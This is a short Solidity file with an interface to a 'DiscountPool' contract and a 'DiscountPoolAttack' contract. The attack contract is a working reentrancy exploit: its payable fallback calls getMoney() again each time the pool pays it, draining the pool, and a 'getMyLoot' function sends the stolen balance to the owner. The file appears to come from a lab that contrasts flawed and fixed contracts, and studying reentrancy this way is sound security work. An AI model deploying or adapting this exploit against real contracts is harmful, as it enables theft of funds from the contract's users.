pragma solidity ^0.4.4;

// To be agnostic of fixed or flawed pool let's just put the interface here
contract DiscountPool {
    mapping (address => uint) public tokens;
    function getMoney(){}
    function sendToken(address receiver, uint amount){}
}



contract DiscountPoolAttack {

    DiscountPool discountPool;
    address owner;

    modifier only_owner { if (msg.sender != owner) {
            throw;
        }
        _;
    }

    function DiscountPoolAttack(address discountPoolAddress) {
        owner = msg.sender;
        discountPool = DiscountPool(discountPoolAddress);
    }

    function attack() only_owner {
        discountPool.getMoney();
    }

    // fallback function
    function () payable {
        discountPool.getMoney();
    }

    function getMyLoot() only_owner {
        msg.sender.send(this.balance);
    }

}
